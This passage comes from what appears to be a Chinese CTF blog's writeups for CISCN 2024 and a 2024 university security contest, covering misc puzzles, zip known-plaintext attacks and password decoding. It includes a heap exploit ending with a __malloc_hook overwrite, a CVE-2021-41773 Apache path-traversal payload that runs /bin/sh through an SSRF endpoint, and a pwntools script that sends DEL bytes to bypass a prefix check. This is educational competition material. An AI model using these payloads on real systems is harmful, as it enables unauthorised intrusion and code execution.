class="line">choice(<span class="number">2</span>)</span><br><span class="line">libc_addr = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:] + <span class="string">b&#x27;\0\0&#x27;</span>) - <span class="number">1640</span> - <span class="number">0x10</span></span><br><span class="line">libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">success(<span class="string">&#x27;libc_addr: &#x27;</span> + <span class="built_in">hex</span>(libc_addr))</span><br><span class="line">one = [<span class="number">0x45226</span>, <span class="number">0x4527a</span>, <span class="number">0xf03a4</span>, <span class="number">0xf1247</span>]</span><br><span class="line">add(<span class="number">0x68</span>, <span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">choice(<span class="number">3</span>)</span><br><span class="line">edit(<span class="number">0x10</span>, p64(libc_addr + libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>] - <span class="number">0x23</span>))</span><br><span class="line">add(<span class="number">0x68</span>, <span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">0x68</span>, <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x13</span>) + p64(libc_addr + one[<span class="number">2</span>]))</span><br><span class="line">choice(<span class="number">1</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;content:&#x27;</span>, <span class="built_in">str</span>(<span class="number">0x20</span>))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">全国大学生信息安全竞赛 CISCN 2024 Writeup</summary>
    
    
    
    <category term="Writeup" scheme="https://www.fomal.cc/categories/Writeup/"/>
    
    
    <category term="CTF" scheme="https://www.fomal.cc/tags/CTF/"/>
    
    <category term="Competition" scheme="https://www.fomal.cc/tags/Competition/"/>
    
  </entry>
  
  <entry>
    <title>高校网络安全管理运维赛2024</title>
    <link href="https://www.fomal.cc/posts/17915e48.html"/>
    <id>https://www.fomal.cc/posts/17915e48.html</id>
    <published>2024-05-14T07:34:35.000Z</published>
    <updated>2024-06-06T11:11:47.127Z</updated>
    
    <content type="html"><![CDATA[<span id="more"></span><h1>Misc</h1><h2 id="签到">签到</h2><p>GIF 拆分 字符拼接</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">synt&#123;guvf-vf-gur-fvtava-dhvm&#125;</span><br><span class="line"></span><br><span class="line">ROT13:</span><br><span class="line">flag&#123;this-is-the-signin-quiz&#125;</span><br></pre></td></tr></table></figure><h2 id="钓鱼邮件识别">钓鱼邮件识别</h2><p>打开eml<br><img src="https://cdn.nlark.com/yuque/0/2024/png/40618712/1715000987869-fef6e026-ab6e-48b6-9021-2bfaea76c5f7.png#averageHue=%23f0eeed&amp;clientId=u27152c86-e274-4&amp;from=paste&amp;height=581&amp;id=udff21a67&amp;originHeight=872&amp;originWidth=1680&amp;originalType=binary&amp;ratio=1.5&amp;rotation=0&amp;showTitle=false&amp;size=95596&amp;status=done&amp;style=none&amp;taskId=u05ad4560-fb10-4616-898b-cda133bda73&amp;title=&amp;width=1120" alt="image.png"><br>base64解码<br><img src="https://cdn.nlark.com/yuque/0/2024/png/40618712/1715001044105-c0cd5507-856c-4be4-a5c6-81ae9cdd50b2.png#averageHue=%23f0eeee&amp;clientId=u27152c86-e274-4&amp;from=paste&amp;height=796&amp;id=u40cbeb7d&amp;originHeight=1194&amp;originWidth=1217&amp;originalType=binary&amp;ratio=1.5&amp;rotation=0&amp;showTitle=false&amp;size=299105&amp;status=done&amp;style=none&amp;taskId=u452493a0-5876-4ab4-a782-0e3fd32b6b6&amp;title=&amp;width=811.3333333333334" alt="image.png"></p><h3 id="Flag1">Flag1</h3><p><img src="https://cdn.nlark.com/yuque/0/2024/png/40618712/1715001095282-61c50ca4-113e-4166-a0dc-5e30556e66f1.png#averageHue=%23f2f0f0&amp;clientId=u27152c86-e274-4&amp;from=paste&amp;height=154&amp;id=u298f23e6&amp;originHeight=231&amp;originWidth=1207&amp;originalType=binary&amp;ratio=1.5&amp;rotation=0&amp;showTitle=false&amp;size=57021&amp;status=done&amp;style=none&amp;taskId=u629f2172-4f06-471e-ae52-b029e298d61&amp;title=&amp;width=804.6666666666666" alt="image.png"></p><h3 id="Flag2">Flag2</h3><p><img src="https://cdn.nlark.com/yuque/0/2024/png/40618712/1715001124983-548bb90b-03a6-43f9-944c-771e6b3d6a61.png#averageHue=%23e5e5e1&amp;clientId=u27152c86-e274-4&amp;from=paste&amp;height=56&amp;id=uc548bc24&amp;originHeight=84&amp;originWidth=283&amp;originalType=binary&amp;ratio=1.5&amp;rotation=0&amp;showTitle=false&amp;size=10693&amp;status=done&amp;style=none&amp;taskId=u21d028cf-74ce-4e2b-8c6e-c25ddd55428&amp;title=&amp;width=188.66666666666666" alt="image.png"></p><h3 id="Flag3">Flag3</h3><p>第三段解析DNS的记录<br><img src="https://cdn.nlark.com/yuque/0/2024/png/40618712/1715001261727-291d9bf4-b786-4932-a8df-dd9f00697bb6.png#averageHue=%23f4f4f3&amp;clientId=uc38c9fc2-51bb-4&amp;from=paste&amp;height=736&amp;id=u91730a03&amp;originHeight=1104&amp;originWidth=1509&amp;originalType=binary&amp;ratio=1.5&amp;rotation=0&amp;showTitle=false&amp;size=117830&amp;status=done&amp;style=none&amp;taskId=u76ac0f79-b444-4261-96e7-e57dbf97cb5&amp;title=&amp;width=1006" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2024/png/40618712/1715001299780-c1782382-0fb4-4ca7-9251-c3cad35c76d0.png#averageHue=%23f4f4f3&amp;clientId=uc38c9fc2-51bb-4&amp;from=paste&amp;height=819&amp;id=u0f3a6024&amp;originHeight=1228&amp;originWidth=1787&amp;originalType=binary&amp;ratio=1.5&amp;rotation=0&amp;showTitle=false&amp;size=156994&amp;status=done&amp;style=none&amp;taskId=ua783e53a-f8ac-4e0c-8f39-bbce8619212&amp;title=&amp;width=1191.3333333333333" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2024/png/40618712/1715001333207-14d79fb1-0bd1-4621-861c-02cc90060d10.png#averageHue=%23f4f4f4&amp;clientId=u27152c86-e274-4&amp;from=paste&amp;height=743&amp;id=ud216f656&amp;originHeight=1114&amp;originWidth=1757&amp;originalType=binary&amp;ratio=1.5&amp;rotation=0&amp;showTitle=false&amp;size=122717&amp;status=done&amp;style=none&amp;taskId=ua65b1fa8-c3b3-4e1d-8277-02485e45c02&amp;title=&amp;width=1171.3333333333333" alt="image.png"></p><h2 id="easyshell">easyshell</h2><p>追踪流到倒数几个服务器流量解密发现如下<br><img src="https://cdn.nlark.com/yuque/0/2024/png/40496941/1715001338674-b5b72b11-14fe-4801-bb12-512dbc2055c7.png#averageHue=%23f1eee3&amp;clientId=u97ca04e8-5b2a-4&amp;from=paste&amp;height=685&amp;id=uae05dd4f&amp;originHeight=1028&amp;originWidth=2273&amp;originalType=binary&amp;ratio=1.5&amp;rotation=0&amp;showTitle=false&amp;size=365427&amp;status=done&amp;style=none&amp;taskId=u9d4285e5-ac30-459f-9259-d4cf393aa7c&amp;title=&amp;width=1515.3333333333333" alt="image.png"><br>pk头，是zip，保存成zip文件<br><img src="https://cdn.nlark.com/yuque/0/2024/png/40496941/1715001645217-5d17990d-6c8c-4465-b275-35ea6f729738.png#averageHue=%23e6e5e4&amp;clientId=u97ca04e8-5b2a-4&amp;from=paste&amp;height=533&amp;id=u89338278&amp;originHeight=799&amp;originWidth=2301&amp;originalType=binary&amp;ratio=1.5&amp;rotation=0&amp;showTitle=false&amp;size=287706&amp;status=done&amp;style=none&amp;taskId=ucc729f83-9ae1-45ca-95c0-a6d56ce6d5f&amp;title=&amp;width=1534" alt="image.png"><br>还发现了secret2.txt的内容<br>用上述txt，明文攻击zip<br><img src="https://cdn.nlark.com/yuque/0/2024/png/40978818/1715001905837-864105ca-f4d3-4a3f-9c95-0245f0ea4213.png#averageHue=%23161616&amp;clientId=u1afddc1b-603e-4&amp;from=paste&amp;height=177&amp;id=ua192efbe&amp;originHeight=276&amp;originWidth=1306&amp;originalType=binary&amp;ratio=1.5625&amp;rotation=0&amp;showTitle=false&amp;size=35216&amp;status=done&amp;style=none&amp;taskId=u21076285-af22-44b2-a780-639183be2db&amp;title=&amp;width=835.84" alt="image.png"><br>用明文攻击获取到的key直接解secret1.txt<br><img src="https://cdn.nlark.com/yuque/0/2024/png/40618712/1715002034550-435df7d3-1d87-4d19-bd0f-e9d58ffa7c59.png#averageHue=%23e9e8e7&amp;clientId=uc38c9fc2-51bb-4&amp;from=paste&amp;height=371&amp;id=uabab6e87&amp;originHeight=557&amp;originWidth=571&amp;originalType=binary&amp;ratio=1.5&amp;rotation=0&amp;showTitle=false&amp;size=114715&amp;status=done&amp;style=none&amp;taskId=u3e46b3da-e009-42ed-9215-d3124941c50&amp;title=&amp;width=380.6666666666667" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2024/png/40618712/1715002091520-7cfff066-25f7-45f8-834b-e5bb657af9c1.png#averageHue=%23d1a970&amp;clientId=uc38c9fc2-51bb-4&amp;from=paste&amp;height=231&amp;id=udaace66e&amp;originHeight=347&amp;originWidth=1335&amp;originalType=binary&amp;ratio=1.5&amp;rotation=0&amp;showTitle=false&amp;size=68080&amp;status=done&amp;style=none&amp;taskId=u6f8be26f-5e1e-4c2f-b7c1-23145c69071&amp;title=&amp;width=890" alt="image.png"></p><h2 id="SecretDB">SecretDB</h2><p>用DB Browser for SQLite查看数据库，但是说flag不在这里<br><img src="https://cdn.nlark.com/yuque/0/2024/png/40618712/1715008667764-0af23da2-58f8-4414-81e6-ed0f8c87301c.png#averageHue=%23f7f7f6&amp;clientId=ue02307c4-04be-4&amp;from=paste&amp;height=313&amp;id=u586e86e7&amp;originHeight=391&amp;originWidth=1266&amp;originalType=binary&amp;ratio=1.25&amp;rotation=0&amp;showTitle=false&amp;size=30839&amp;status=done&amp;style=none&amp;taskId=u4e4db746-4cc3-4594-93e8-d9d9b968c13&amp;title=&amp;width=1012.8" alt="image.png"><br>放到010中，发现这句话下面还藏着点东西，在01 0F之间有东西<br><img src="https://cdn.nlark.com/yuque/0/2024/png/40618712/1715008933494-3b65d672-7a46-4b52-ab2d-94c5abb2123a.png#averageHue=%2386c292&amp;clientId=ue02307c4-04be-4&amp;from=paste&amp;height=406&amp;id=tOoxc&amp;originHeight=508&amp;originWidth=659&amp;originalType=binary&amp;ratio=1.25&amp;rotation=0&amp;showTitle=false&amp;size=55792&amp;status=done&amp;style=none&amp;taskId=u489604f7-52c6-4411-ad0d-04475762b90&amp;title=&amp;width=527.2" alt="image.png"><br>然后写脚本进行提取</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;secret.db&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    c = f.read()</span><br><span class="line"></span><br><span class="line">flag = &#123;&#125;</span><br><span class="line">parts = c.split(<span class="string">b&#x27;\x01\x0f&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> parts[<span class="number">1</span>:-<span class="number">2</span>]:  <span class="comment"># 修正切片范围</span></span><br><span class="line">    flag[i[<span class="number">0</span>]] = <span class="built_in">chr</span>(i[<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 直接按照排序后的键值对打印结果</span></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">sorted</span>(flag.keys()):</span><br><span class="line">    <span class="built_in">print</span>(flag[k], end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 或者使用下面的一行代码来替代上面的 for 循环</span></span><br><span class="line"><span class="comment"># print(&#x27;&#x27;.join([flag[k] for k in sorted(flag.keys())]))</span></span><br></pre></td></tr></table></figure><h2 id="Gateway">Gateway</h2><p>在附件中找到了密码，但还是编码的<br><img src="https://cdn.nlark.com/yuque/0/2024/png/40618712/1715006887010-6a828109-1d9a-441e-bc11-9f8886d24aea.png#averageHue=%23fcfaf9&amp;clientId=ue02307c4-04be-4&amp;from=paste&amp;height=546&amp;id=pD8i3&amp;originHeight=682&amp;originWidth=1429&amp;originalType=binary&amp;ratio=1.25&amp;rotation=0&amp;showTitle=false&amp;size=106870&amp;status=done&amp;style=none&amp;taskId=u5b2fa89a-8cf7-4209-b10f-a85f6b49e4c&amp;title=&amp;width=1143.2" alt="image.png"><br>在题目附件里发现这个，联想到电信光猫的超密解密<br><img src="https://cdn.nlark.com/yuque/0/2024/png/40618712/1715009440301-bf91241e-f275-4c43-9729-fa66683d8488.png#averageHue=%23e4f2f0&amp;clientId=ue02307c4-04be-4&amp;from=paste&amp;height=84&amp;id=u807f3ad5&amp;originHeight=105&amp;originWidth=534&amp;originalType=binary&amp;ratio=1.25&amp;rotation=0&amp;showTitle=false&amp;size=46720&amp;status=done&amp;style=none&amp;taskId=uee655861-9d30-49c5-988f-6d76061f717&amp;title=&amp;width=427.2" alt="image.png"><br>参考内容<br><a href="https://cloud.tencent.com/developer/article/2006614">破解光猫超级管理员密码，也就是获取telecomadmin的密码</a><br>把里面的数字提取，然后三位数的内容把数字减掉4，从ASCII转字符即可，其他部分直接从ASCII转成字符即可，拼在一起</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">numbers = <span class="selector-attr">[106, 112, 101, 107, 127, 101, 104, 49, 57, 56, 53, 56, 54, 56, 49, 51, 51, 105, 56, 103, 106, 49, 56, 50, 56, 103, 102, 56, 52, 101, 104, 102, 105, 53, 101, 53, 102, 129]</span></span><br><span class="line"></span><br><span class="line">decode = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> <span class="selector-tag">i</span> <span class="keyword">in</span> numbers:</span><br><span class="line">    <span class="keyword">if</span> <span class="selector-tag">i</span> <span class="comment">// 100 != 0:</span></span><br><span class="line">        decode += <span class="built_in">chr</span>(<span class="selector-tag">i</span> - <span class="number">4</span>)    #三位数的按字母处理</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        decode += <span class="built_in">chr</span>(i)        #两位数的按数字处理</span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(decode)</span></span></span><br></pre></td></tr></table></figure><h2 id="Apache">Apache</h2><ul><li>源码：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,request,send_file</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">app = Flask(<span class="string">&quot;webserver&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>,methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> send_file(__file__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/nc&#x27;</span>,methods=[<span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">nc</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        dstport=<span class="built_in">int</span>(request.form[<span class="string">&#x27;port&#x27;</span>])</span><br><span class="line">        data=request.form[<span class="string">&#x27;data&#x27;</span>]</span><br><span class="line">        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">        s.settimeout(<span class="number">1</span>)</span><br><span class="line">        s.connect((<span class="string">&#x27;127.0.0.1&#x27;</span>, dstport))</span><br><span class="line">        s.send(data.encode())</span><br><span class="line">        recvdata = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            chunk = s.recv(<span class="number">2048</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> chunk.strip():</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                recvdata += chunk</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">return</span> recvdata</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">str</span>(e)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>,port=<span class="number">8080</span>,threaded=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><p>CVE-2021-41773<br><a href="https://blog.csdn.net/luochen2436/article/details/120698682">https://blog.csdn.net/luochen2436/article/details/120698682</a><br>payload:</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">port</span>=<span class="number">80</span>&amp;data=POST%<span class="number">20</span>%<span class="number">2</span>fcgi-bin%<span class="number">2</span>f.%<span class="number">252</span>e%<span class="number">2</span>f.%<span class="number">252</span>e%<span class="number">2</span>f.%<span class="number">252</span>e%<span class="number">2</span>f.%<span class="number">252</span>e%<span class="number">2</span>fbin%<span class="number">2</span>fsh%<span class="number">20</span>HTTP%<span class="number">2</span>f1.<span class="number">1</span>%<span class="number">0</span>d%<span class="number">0</span>aHost%<span class="number">3</span>a%<span class="number">20127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>%<span class="number">0</span>d%<span class="number">0</span>aAccept%<span class="number">3</span>a%<span class="number">20</span>*%<span class="number">2</span>f*%<span class="number">0</span>d%<span class="number">0</span>aAccept-Language%<span class="number">3</span>a%<span class="number">20</span>zh-CN%<span class="number">2</span>czh%<span class="number">3</span>bq%<span class="number">3</span>d0.<span class="number">8</span>%<span class="number">2</span>czh-TW%<span class="number">3</span>bq%<span class="number">3</span>d0.<span class="number">7</span>%<span class="number">2</span>czh-HK%<span class="number">3</span>bq%<span class="number">3</span>d0.<span class="number">5</span>%<span class="number">2</span>cen-US%<span class="number">3</span>bq%<span class="number">3</span>d0.<span class="number">3</span>%<span class="number">2</span>cen%<span class="number">3</span>bq%<span class="number">3</span>d0.<span class="number">2</span>%<span class="number">0</span>d%<span class="number">0</span>aAccept-Encoding%<span class="number">3</span>a%<span class="number">20</span>gzip%<span class="number">2</span>c%<span class="number">20</span>deflate%<span class="number">0</span>d%<span class="number">0</span>aContent-Type%<span class="number">3</span>a%<span class="number">20</span>application%<span class="number">2</span>fx-www-form-urlencoded%<span class="number">0</span>d%<span class="number">0</span>aCache%<span class="number">3</span>a%<span class="number">20</span>no-cache%<span class="number">0</span>d%<span class="number">0</span>aContent-Length%<span class="number">3</span>a%<span class="number">2012</span>%<span class="number">0</span>d%<span class="number">0</span>aConnection%<span class="number">3</span>a%<span class="number">20</span>close%<span class="number">0</span>d%<span class="number">0</span>a%<span class="number">0</span>d%<span class="number">0</span>aecho%<span class="number">3</span>bcat%<span class="number">20</span>%<span class="number">2</span>ff*%<span class="number">0</span>d%<span class="number">0</span>a%<span class="number">0</span>d%<span class="number">0</span>a</span><br></pre></td></tr></table></figure><h2 id="f-or-r">f or r</h2><p>一层一层解压.cab文件，找到Cab for KB114514 PSFX，发现跟前两天的GeekCTF的题有点像<br><img src="https://cdn.nlark.com/yuque/0/2024/png/43707272/1715000942707-a763ffbe-d4f5-490e-92f6-32bd3b39dfaa.png#averageHue=%23f8f7f5&amp;clientId=u506acabf-9db4-4&amp;from=paste&amp;height=128&amp;id=u4475e9fb&amp;originHeight=192&amp;originWidth=496&amp;originalType=binary&amp;ratio=1.5&amp;rotation=0&amp;showTitle=false&amp;size=11091&amp;status=done&amp;style=none&amp;taskId=u02652051-23f7-4995-b420-0dbb8af714b&amp;title=&amp;width=330.6666666666667" alt="image.png"><br>参考链接：<br><a href="https://qanux.github.io/2024/04/22/geek2024/index.html">https://qanux.github.io/2024/04/22/geek2024/index.html</a><br>利用脚本进行更新<br><img src="https://cdn.nlark.com/yuque/0/2024/png/43707272/1715000915845-57755e75-109f-4bcd-92d8-01649e10567f.png#averageHue=%23e9e9e9&amp;clientId=u506acabf-9db4-4&amp;from=paste&amp;height=79&amp;id=u5b8ab700&amp;originHeight=119&amp;originWidth=1138&amp;originalType=binary&amp;ratio=1.5&amp;rotation=0&amp;showTitle=false&amp;size=19958&amp;status=done&amp;style=none&amp;taskId=uc31c430d-408b-46fb-89b1-4fcbfd0d67c&amp;title=&amp;width=758.6666666666666" alt="image.png"><br>这里的o_curl.exe是当前自己系统的curl.exe，-o是要输出的文件名，r为回滚的，要把这个r里的解压出来的文件替换成自己系统的补丁里的，f里的是压缩包里的（事实上就这一个有用的）<br>出来个nnn.exe<br>自己系统补丁位置：<br><img src="https://cdn.nlark.com/yuque/0/2024/png/43707272/1715000871074-f02c0e14-6dd7-4369-80b2-ab0fc49ce6d3.png#averageHue=%23f9f8f8&amp;clientId=u506acabf-9db4-4&amp;from=paste&amp;height=134&amp;id=u3b91cc18&amp;originHeight=201&amp;originWidth=773&amp;originalType=binary&amp;ratio=1.5&amp;rotation=0&amp;showTitle=false&amp;size=16654&amp;status=done&amp;style=none&amp;taskId=ub71bc11d-2583-43a8-bd2f-98de89d2d2e&amp;title=&amp;width=515.3333333333334" alt="image.png"><br>大概就是在winsxs中搜索curl有关的文件（也可能不是这里边的，在其他补丁里，直接全局搜也行）<br>运行命令后得到最终输出的文件<br>看下版本<br><img src="https://cdn.nlark.com/yuque/0/2024/png/43707272/1715000887771-38ef610f-f0f8-4119-a0cf-64d42a8e897f.png#averageHue=%23151311&amp;clientId=u506acabf-9db4-4&amp;from=paste&amp;height=93&amp;id=ua4ea2b61&amp;originHeight=139&amp;originWidth=824&amp;originalType=binary&amp;ratio=1.5&amp;rotation=0&amp;showTitle=false&amp;size=19767&amp;status=done&amp;style=none&amp;taskId=u2490ad99-dc3a-4047-a7ab-81197a1415c&amp;title=&amp;width=549.3333333333334" alt="image.png"><br>得到flag</p><h2 id="zip">zip</h2><p>nc后用队伍token连接<br><img src="https://cdn.nlark.com/yuque/0/2024/png/40618712/1714994481062-c54c911c-25a6-4e4f-af53-dc48ae968a09.png#averageHue=%23050403&amp;clientId=uc38c9fc2-51bb-4&amp;from=paste&amp;height=737&amp;id=ua208fa5a&amp;originHeight=1105&amp;originWidth=1362&amp;originalType=binary&amp;ratio=1.5&amp;rotation=0&amp;showTitle=false&amp;size=276409&amp;status=done&amp;style=none&amp;taskId=u0389955e-c2da-41c1-8fc8-da60ae70065&amp;title=&amp;width=908" alt="image.png"><br>源码main函数分析</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span> </span>&#123;</span><br><span class="line">    <span class="built_in">load</span>();</span><br><span class="line">    <span class="built_in">system</span>(<span class="string">&quot;7z&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;your token:&quot;</span>);<span class="comment">//输入token</span></span><br><span class="line">    <span class="built_in">fflush</span>(stdout);</span><br><span class="line">    <span class="built_in">fgets</span>(buf, <span class="built_in">sizeof</span>(buf), stdin);</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">cmpstr</span>(token, buf)) &#123;<span class="comment">//进行校验</span></span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;wrong token!&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">zip</span>(buf);<span class="comment">//压缩文件</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;your flag:&quot;</span>);</span><br><span class="line">    <span class="built_in">fflush</span>(stdout);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fgets</span>(buf, <span class="built_in">sizeof</span>(buf), stdin);</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">cmpstr</span>(<span class="string">&quot;flag&#123;&quot;</span>, buf)) &#123;<span class="comment">//进行校验</span></span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;wrong flag!&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">unzip</span>(buf);<span class="comment">//解压</span></span><br><span class="line"></span><br><span class="line">    FILE *f = <span class="built_in">fopen</span>(<span class="string">&quot;flag.txt&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (!f) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;flag.txt not found&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">fgets</span>(buf, <span class="built_in">sizeof</span>(buf), f);</span><br><span class="line">    <span class="built_in">fclose</span>(f);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;flag: %s\n&quot;</span>, buf);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>连接后<br>1.先比较token<br>2.然后用token做密码去压缩<br>3.要用以“flag{”开头的字符串<br>4.得到解压的flag<br>其中<br>token在处理时，在第65置0，所以就要token的前64位<br>3步中要绕过flag{，可以通过传DEL（ASCII:127）删除<br>payload</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;prob03.contest.pku.edu.cn&#x27;</span>, <span class="number">10003</span>, level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">p.sendlineafter(b<span class="string">&#x27;Please input your token: &#x27;</span>,</span><br><span class="line">                b<span class="string">&#x27;468:MEYCIQCSFzmz7YKQQSyTyG0KfXOcsHbsrQxCKD5bUvCixeW7xwIhAJD6lBpyqK9_IVF2Qw0Y78gKJ3afeacA9ckn0feIZUYl&#x27;</span>)#</span><br><span class="line"></span><br><span class="line">p.sendlineafter(b<span class="string">&#x27;your token:\n&#x27;</span>, b<span class="string">&#x27;468:MEYCIQCSFzmz7YKQQSyTyG0KfXOcsHbsrQxCKD5bUvCixeW7xwIhAJD6lBpy&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = b<span class="string">&#x27;flag&#123;&#x27;</span>+b<span class="string">&#x27;\x7f&#x27;</span>*<span class="number">5</span>+b<span class="string">&quot;468:MEYCIQCSFzmz7YKQQSyTyG0KfXOcsHbsrQxCKD5bUvCixeW7xwIhAJD6lBpy&quot;</span></span><br><span class="line">p.sendlineafter(b<span class="string">&#x27;your flag:\n&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1>Web</h1><h2 id="phpsql">phpsql</h2><p>注册admin显示已经存在</p><p><img 